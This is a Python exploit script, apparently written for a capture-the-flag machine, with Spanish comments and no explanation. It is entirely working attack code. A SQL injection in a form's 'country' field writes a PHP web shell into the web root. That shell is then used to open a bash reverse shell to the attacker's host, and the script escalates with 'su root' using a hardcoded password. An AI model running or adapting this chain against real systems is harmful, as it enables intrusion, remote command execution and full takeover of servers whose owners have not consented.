#!/usr/bin/python3

import pdb, requests, signal
from pwn import *

#Ctrol+C
def ctrl_c(sig, frame):
    print("\n\n [*] Saliendo del programa... [*]\n")
    sys.exit(1)
signal.signal(signal.SIGINT, ctrl_c)


#Comprobación de argumentos:
if len(sys.argv) !=4:
    log.failure("Número incorrecto de argumentos.\nUso: %s <filename> <ip_address> <localhost>" % sys.argv[0])
    sys.exit(1)

#Variables Globales:
ip_address = sys.argv[2]
filename = sys.argv[1]
localhost = sys.argv[3]
url = "http://%s/" % ip_address
lport = 443

#Funciones:
def archivo():
    data = {
        'username': 'loquesea',
        'country': """Albania' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -""" % filename
    }
    r = requests.post(url, data=data)

def reverse():
    data = {
        'cmd' : "bash -c 'bash -i >& /dev/tcp/%s/443 0>&1'" % localhost
    }
    r = requests.post(url + "%s" % filename, data=data)

if __name__ == '__main__':
    archivo()
    try:
        threading.Thread(target=reverse, args=()).start()
    except Exception as error:
        log.error(str(error))

    shell = listen(lport, timeout=25).wait_for_connection()
    shell.sendline("su root")
    time.sleep(3)
    shell.sendline("uhc-9qual-global-pw")
    shell.interactive()
